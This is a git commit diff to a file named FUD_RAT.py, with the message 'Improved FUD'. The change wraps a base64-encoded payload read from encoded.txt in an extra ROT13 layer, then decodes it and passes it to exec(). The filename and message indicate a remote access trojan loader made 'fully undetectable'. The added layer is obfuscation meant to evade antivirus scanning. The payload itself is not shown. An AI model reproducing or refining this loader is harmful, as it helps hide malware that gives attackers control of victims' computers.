6e36b1a6db04ee0ee0aaf2f5ed5a4512e9e1b954
Noah Kuttler <NoahKuttler@protonmail.com>
2022-02-07 22:14:59 -0600

    Improved FUD

--- FUD_RAT.py
+++ FUD_RAT.py
@@ -1,6 +1,8 @@
 import base64
+import codecs
 
-b64code = open('encoded.txt', 'rb').read()
-code = base64.b64decode(b64code).decode('utf-8')
+r13code = open('encoded.txt', 'r').read()
+b64code = codecs.decode(r13code, 'rot_13')
+code = base64.b64decode(b64code.encode('utf-8')).decode('utf-8')
 
 exec(code)
